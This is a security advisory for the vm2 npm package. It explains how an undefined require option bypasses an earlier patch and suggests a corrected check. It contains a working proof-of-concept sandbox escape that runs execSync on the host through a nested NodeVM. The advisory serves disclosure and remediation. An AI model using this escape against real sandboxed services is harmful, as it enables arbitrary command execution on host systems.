# [C] vm2 has a CVE-2023-37903 patch bypass: nesting:true without explicit require still allows full RCE

## Summary
Severity: Critical
Advisory: GHSA-m4wx-m65x-ghrr
CVE: CVE-2026-47137
CWE: CWE-913
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-m4wx-m65x-ghrr
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.4

## Details
## Summary

The fix for GHSA-8hg8-63c5-gwmx (CVE-2023-37903) introduced a check in `nodevm.js` line 263 that blocks the combination `nesting: true` + `require: false`. However, the check uses strict equality (`options.require === false`), which is trivially bypassed by omitting the `require` option entirely.

When `require` is not specified, `options.require` is `undefined`, not `false`. The strict equality check fails, so the security guard is skipped. Immediately after (line 280), the destructuring default `require: requireOpts = false` assigns `requireOpts = false`, producing the exact configuration the patch was designed to prevent.

## Root Cause

```javascript
// nodevm.js:263 — the security check
if (options.nesting === true && options.require === false) {
    throw new VMError('...');
}
// nodevm.js:280 — the default assignment (AFTER the check)
const { require: requireOpts = false } = options;
// When options.require is undefined:
//   - Line 263: undefined === false → FALSE → check skipped
//   - Line 280: requireOpts = false → same as require:false
```

## Impact

Full Remote Code Execution on the host system. An attacker running code inside a `NodeVM({ nesting: true })` sandbox (without specifying `require`) can:

1. `require('vm2')` to get the vm2 library
2. Construct an inner `NodeVM` with `require: { builtin: ['child_process'] }`
3. Execute arbitrary OS commands via `child_process.execSync`

The inner VM is completely unconstrained by the outer sandbox configuration.

## Reproduction

```javascript
const { NodeVM } = require('vm2');

// nesting:true, require not specified (defaults to false AFTER the check)
const nvm = new NodeVM({ nesting: true });

const result = nvm.run(`
  const { NodeVM } = require('vm2');
  const inner = new NodeVM({
    require: { builtin: ['child_process'] }
  });
  module.exports = inner.run(
    "module.exports = require('child_process').execSync('id').toString()",
    'exploit.js'
  );
`, 'exploit.js');

console.log(result); // prints host uid/gid — full RCE
```

## Suggested Fix

```javascript
// Change the check to catch both false and undefined/omitted:
if (options.nesting === true && !options.require) {
    throw new VMError('...');
}
```

Or move the check after the destructuring default assignment:

```javascript
const { require: requireOpts = false } = options;
if (options.nesting === true && !requireOpts) {
    throw new VMError('...');
}
```

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-m4wx-m65x-ghrr
- https://nvd.nist.gov/vuln/detail/CVE-2026-47137
- https://github.com/patriksimek/vm2/commit/01a7552add345d5a6862623884e6b79a85bf0568
- https://github.com/patriksimek/vm2/commit/86ab819f202c3a8dad88cef5705f2e416c5188d7
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.4
